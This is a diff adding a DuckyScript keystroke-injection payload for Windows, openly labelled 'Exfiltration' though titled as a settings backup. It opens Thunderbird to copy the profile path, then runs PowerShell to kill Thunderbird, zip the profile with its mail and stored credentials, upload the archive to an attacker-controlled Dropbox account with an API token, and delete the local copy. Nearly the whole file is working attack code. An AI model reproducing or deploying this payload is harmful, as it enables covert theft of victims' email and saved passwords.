@@ -1,0 +1,121 @@
+REM ###############################################################
+REM #                                                             #
+REM # Title       : Save Your Thunderbird Settings via Dropbox    #
+REM # Author      : Aleff                                         #
+REM # Version     : 1.0                                           #
+REM # Category    : Exfiltration                                  #
+REM # Target      : Windows 10/11                                 #
+REM #                                                             #
+REM ###############################################################
+
+REM Opening Thunderbird settings
+DELAY 1500
+WIN r
+STRING thunderbird
+ENTER
+DELAY 1000
+TAB
+TAB
+TAB
+TAB
+DELAY 500
+ENTER
+DELAY 500
+UPARROW
+UPARROW
+DELAY 500
+ENTER
+DELAY 500
+UPARROW
+UPARROW
+UPARROW
+DELAY 500
+ENTER
+DELAY 500
+
+REM Inside the settings
+TAB
+TAB
+TAB
+TAB
+TAB
+TAB
+TAB
+TAB
+TAB
+TAB
+TAB
+DELAY 500
+ENTER
+DELAY 500
+
+REM Inside The Profile Folder
+TAB
+TAB
+TAB
+TAB
+DELAY 500
+ENTER
+DELAY 500
+CTRL c
+DELAY 500
+ALT F4
+DELAY 500
+
+REM Powershell running...
+WIN R
+STRING powershell
+ENTER
+DELAY 1500
+STRING cd $env:TEMP
+ENTER
+DELAY 500
+STRING Stop-Process -Name "thunderbird" -Force
+ENTER
+DELAY 500
+STRING Compress-Archive -LiteralPath 
+DELAY 500
+CTRL v
+DELAY 500
+REM Required replace '[2]': Set here the archive name, you must use the same!
+STRING  -DestinationPath ./[2]
+ENTER
+DELAY 1000
+
+REM Exfiltration via Dropbox
+REM Required replace '[2]': Set here the archive name, you must use the same!
+STRING $filePath = "$env:TEMP/[2]"
+ENTER
+DELAY 500
+STRING $filePath = $filePath -replace "\\", "/"
+ENTER
+DELAY 500
+REM Required replace '[2]': Set here the archive name, you must use the same!
+REM Required replace '[3]': Set here the path of your dropbox folder, i.e. '/'
+STRING $dropboxPath = "[3][2]"
+ENTER
+DELAY 500
+REM Required replace '[1]': Set here your Dropbox access TOKEN, i.e. mine is aHR0cHM6Ly93d3cueW91dHViZS5jb20vd2F0Y2g/dj1Sdlk1cGxvbzFPSQ==
+STRING $accessToken = "[1]"
+ENTER
+DELAY 500
+STRING $fileContent = [System.IO.File]::ReadAllBytes($filePath)
+ENTER
+DELAY 500
+STRING $headers = @{
+ENTER
+DELAY 500
+STRING "Authorization" = "Bearer $accessToken"
+ENTER
+DELAY 500
+STRING "Dropbox-API-Arg" = ("{`"path`": `"" + $dropboxPath + "`", `"mode`": `"add`", `"autorename`": true, `"mute`": false}")
+ENTER
+DELAY 500
+STRING "Content-Type" = "application/octet-stream"
+ENTER
+DELAY 500
+STRING }
+ENTER
+DELAY 500
+STRING Invoke-RestMethod -Uri "https://content.dropboxapi.com/2/files/upload" -Method Post -Headers $headers -Body $fileContent; rm $filePath; exit
+ENTER
